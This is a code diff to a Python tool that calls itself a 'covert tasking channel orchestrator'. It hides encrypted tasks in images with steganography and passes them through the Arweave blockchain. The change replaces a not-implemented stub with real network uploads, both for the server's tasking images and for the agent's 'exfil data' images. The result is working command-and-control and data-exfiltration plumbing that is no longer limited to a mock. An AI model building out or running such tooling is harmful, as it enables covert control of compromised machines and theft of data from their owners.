@@ -28,7 +28,7 @@ from src.assembler import OPCODE_TABLE, assemble_payload
 from src.crypto_wrapper import encrypt_task, decrypt_task
 from src.stego import embed, extract
 from src.vm import execute_bytecode
-from src.arweave_interface import MockArweave, download_image, get_wallet_transactions
+from src.arweave_interface import MockArweave, download_image, get_wallet_transactions, upload_image
 
 #Creates the CLI using argparse
 parser = argparse.ArgumentParser(prog="MAIN", description="Covert tasking channel orchestrator")
@@ -40,6 +40,7 @@ server_parser = subparser.add_parser(name="server", description="Server commands
 server_parser.add_argument("--keyfile", required=True, help="Path to keyfile")
 server_parser.add_argument("--task", required=True, help="Space separated assembly")
 server_parser.add_argument("--cover", required=True, help="Path to the cover image")
+server_parser.add_argument("--wallet", required=True, help="Path to arweave wallet file")
 server_parser.add_argument("--mock", action="store_true", help="Use mock Arweave instead of real network")
 
 #Agent subcommand
@@ -119,16 +120,19 @@ def run_server(args):
     logger.info("Step C, Image upload start")
     if args.mock:
         mock = MockArweave()
+        shared_state["mock"] = mock
         txid = mock.upload_image("server_wallet", stego_path)
         logger.info(f"Step C, Image uploaded in transaction_id {txid}")
         logger.info("Step C, Image upload finished")
     else:
-        raise NotImplementedError("Real Arweave upload not configured")
+        server_wallet = load_wallet(args.wallet)
+        txid = upload_image(server_wallet, stego_path)
+        logger.info(f"Step C, Image uploaded in transaction_id {txid}")
+        logger.info("Step C, Image upload finished")
 
     #Stores shared state for the agent
     shared_state["txid"] = txid
     shared_state["new_ratchet"] = new_ratchet
-    shared_state["mock"] = mock
     shared_state["K_extract"] = K_extract
     shared_state["K_ratchet"] = K_ratchet
 
@@ -204,7 +208,14 @@ def run_agent(args):
 
         #Upload exfil data via arweave
         logger.info("Exfil handler step C, exfil data uploading start")
-        txid = shared_state["mock"].upload_image("agent_wallet", exfil_stego_path)
+
+        if args.mock:
+            txid = shared_state["mock"].upload_image("agent_wallet", exfil_stego_path)
+        else:
+            agent_wallet = load_wallet(args.wallet)
+            txid = upload_image(agent_wallet, exfil_stego_path)
+
+       
         logger.info("Exfil handler step C, exfil data uploading finished")
 
         return txid
